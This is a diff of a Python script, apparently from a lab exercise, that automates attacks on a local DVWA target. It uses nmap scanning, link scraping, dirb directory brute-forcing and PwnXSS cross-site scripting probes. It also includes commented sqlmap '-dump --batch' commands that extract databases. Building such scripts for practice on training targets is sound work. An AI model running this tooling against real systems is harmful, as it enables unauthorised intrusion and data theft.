@@ -1,62 +1,73 @@
 import subprocess
 import re
 import nmap
+import requests
+from bs4 import BeautifulSoup
 
-target_url = "10.0.0.64"
-nmap_output_file = "nmap_output.txt"
-sqlmap_output_file = "sqlmap_output.txt"
-dirbuster_output_file = "dirbuster_output.txt"
-nikto_output_file = "nikto_output.txt"
+target_url = "10.0.0.64" #this should be a parameter
 
-# Check which ports are open
+#check which ports are open
 nm = nmap.PortScanner()
 scan_results = nm.scan(target_url, arguments="-sT")
 
 tcp_ports = [port for port in scan_results['scan'][target_url]['tcp'].keys() if scan_results['scan'][target_url]['tcp'][port]['state'] == 'open' and scan_results['scan'][target_url]['tcp'][port]['name'] == 'http']
 
+#attacking every http ports
 for port in tcp_ports:
 
     target_url="http://10.0.0.64:"
-    target_url+=str(port)+'/'
+    target_url+=str(port)+'/DVWA/' #in our case we have the DVWA cause we know we want to hit here
 
-    # Use sqlmap to detect SQL injections and display available databases
-    sqlmap_cmd = "sqlmap --crawl=2 -u {} --dbs --batch > {}".format(target_url, sqlmap_output_file)
-    subprocess.run(sqlmap_cmd, shell=True)
+    #gathering every pages we can in order to attack them (work better for known directories than dirbuster because we use hrefs)
+    pages_to_attack=[]
+    response=requests.get(target_url)
+    soup = BeautifulSoup(response.content,"html.parser")
+    for link in (soup.find_all("a")):
 
-    # Use dirbuster to find hidden directories and files on the target website
-    dirbuster_cmd = "dirb {} ".format(target_url)
+        reference = link.get('href')
+
+        if not(reference.startswith('http')): #outside links are banned, we don't want to attack internet !
+            pages_to_attack.append(target_url+reference)
+
+    print(pages_to_attack)
+
+    #use dirbuster to find hidden directories and files on the target website
+    dirbuster_cmd = f"dirb {target_url} -S"
     dirbuster_output = subprocess.run(dirbuster_cmd, shell=True, capture_output=True).stdout.decode()
-    print(dirbuster_output)
-    # Search for sensitive files in the dirbuster output
-    sensitive_files = []
+
     for line in dirbuster_output.split("\n"):
-        if line.startswith("/path/to/sensitive/file"):
-            sensitive_files.append(line)
 
-    if sensitive_files:
-        print("The following sensitive files were found:")
-        for file in sensitive_files:
-            print(file)
-    else:
-        print("No sensitive files were found.")
+        if line.startswith("==>") or line.startswith("+"):
+            print(line)
 
-    # Use xsser to detect potential XSS vulnerabilities
-    xsser_cmd = "xsser -u {} --batch".format(target_url)
-    xsser_output = subprocess.run(xsser_cmd, shell=True, capture_output=True).stdout.decode()
+    # Use PwnXSS to detect potential XSS vulnerabilities
+    xss_cmd = f"python3 PwnXSS/pwnxss.py -u {target_url} --depth 5"
+    xss_output = subprocess.run(xss_cmd, shell=True, capture_output=True).stdout.decode()
 
-    # Search for XSS vulnerabilities in the xsser output
+    # Search for XSS vulnerabilities in the PwnXSS output
     xss_vulnerabilities = []
-    for line in xsser_output.split("\n"):
-        if "XSS found" in line:
+    for line in xss_output.split("\n"):
+        if "CRITICAL" in line:
+            print(line)
             xss_vulnerabilities.append(line)
 
     if xss_vulnerabilities:
-        print("Potential XSS vulnerabilities were detected:")
         for vulnerability in xss_vulnerabilities:
             print(vulnerability)
     else:
-        print("No potential XSS vulnerabilities were detected.")
+        print(f"No potential XSS vulnerabilities were detected on {target_url}.")
 
-    # Use Nikto to scan the target website
-    nikto_cmd = "nikto -h {} -root /directory/to/scan -User-Agent 'Custom User Agent String' -useproxy http://proxy_server:proxy_port -output {} -ssl -evasion 5 -Format html -Tuning 685,938,958 -Ask no -Display V -dbcheck -nointeractive".format(target_url, nikto_output_file)
-    subprocess.run(nikto_cmd, shell=True)
+    # Use sqlmap to detect SQL injections and display available databases (commented because too verbose, but it works)
+    #sqlmap_cmd = 'sqlmap -u "http://10.0.0.64/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" -dump -v 0 --batch'
+    #sqlmap_output = subprocess.run(sqlmap_cmd, shell=True)
+    #print(sqlmap_output)
+
+    #for url in pages_to_attack: #this version will work if there is a way to mine parameters
+
+        # Use sqlmap to detect SQL injections and display available databases
+        #sqlmap_cmd = f"sqlmap -u {url} -dump -v 0 --batch"
+        #sqlmap_output = subprocess.run(sqlmap_cmd, shell=True)
+
+        #find a way to scrap this output 
+        #print(sqlmap_output)
+
